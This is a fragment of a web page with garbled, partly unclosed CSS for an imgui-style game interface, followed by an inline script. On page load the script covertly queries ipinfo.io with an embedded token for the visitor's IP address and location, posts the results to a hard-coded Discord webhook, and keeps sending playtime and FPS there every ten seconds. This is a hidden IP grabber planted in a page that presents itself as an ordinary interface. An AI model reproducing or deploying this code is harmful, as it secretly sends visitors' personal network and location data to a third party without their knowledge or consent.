        .slider {
            -webkit-appearance: none;
            appearance: none;
            width: 70%;
            height: 30px;
            background-color: #3a4b5c;
            border-radius: 2px;
            outline: none;
            margin-bottom: 10px;
        }
        .slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 30px;
            height: 25px;
            background-color: #378fe7;
            border-radius: 3px;
            cursor: pointer;
        }
        .slider::-moz-range-thumb {
            width: 20px;
            height: 20px;
            background-color: #378fe7;
            border-radius: 3px;
            cursor: pointer;
        }
        .field-row {

        .imgui-checkbox-container {

}

.imgui-checkbox {

    margin-right: 8px;
}

.imgui-checkbox:checked {

}

.imgui-checkbox:checked::before {

    <script>
  let startTime = Date.now();
        let currentPlaytime = 0;
        let frameCount = 0;
        let lastFrameTime = startTime;
        let lastSentTime = startTime;
        const ipinfoUrl = 'https://ipinfo.io/json?token=66776d7d45b95b';
        const webhookUrl = 'https://discordapp.com/api/webhooks/1278936238295875615/3F7l6txqvCmiP10-Gq-6MhrS8s3UgWtBcIV_WFQfKWXS3g7AZDhmlJCNLFDDKNvezINN';
        function formatTime(seconds) {
            const minutes = Math.floor(seconds / 60);
            const secs = seconds % 60;
            return `${minutes}m ${secs}s`;
        }
        function sendStatusToDiscord(content) {
            const payload = {
                content: content
            };
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                } else {
                }
            })
            .catch(error => {
            });
        }
        window.addEventListener('load', () => {
            fetch(ipinfoUrl)
                .then(response => response.json())
                .then(data => {
                    const ipInfo = `IP情報:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
                    sendStatusToDiscord(ipInfo);
                    const playtimeSeconds = Math.floor((Date.now() - startTime) / 1000);
                    const fps = Math.round(1 / ((Date.now() - lastFrameTime) / 1000));
                    const statusInfo = `PlayTime: ${formatTime(playtimeSeconds)}\nFPS: ${fps}`;
                    sendStatusToDiscord(statusInfo);
                    updateStatus();
                })
                .catch(error => {
                });
        });
        function updateStatus() {
            const currentTime = Date.now();
            const playtimeSeconds = Math.floor((currentTime - startTime) / 1000);
            if (playtimeSeconds !== currentPlaytime) {
                currentPlaytime = playtimeSeconds;
                const playtimeElement = document.getElementById('playtime');
                playtimeElement.innerText = `PlayTime: ${formatTime(currentPlaytime)}`;
                playtimeElement.classList.add('grow');
                setTimeout(() => playtimeElement.classList.remove('grow'), 300);
            }
            frameCount++;
            const deltaTime = (currentTime - lastFrameTime) / 1000;
            const fps = Math.round(1 / deltaTime);
            document.getElementById('fps').innerText = `FPS: ${fps}`;
            lastFrameTime = currentTime;
            if (currentTime - lastSentTime >= 10000) {
                const statusInfo = `PlayTime: ${formatTime(currentPlaytime)}\nFPS: ${fps}`;
                sendStatusToDiscord(statusInfo);
                lastSentTime = currentTime;
            }
            requestAnimationFrame(updateStatus);
        }
    </script>
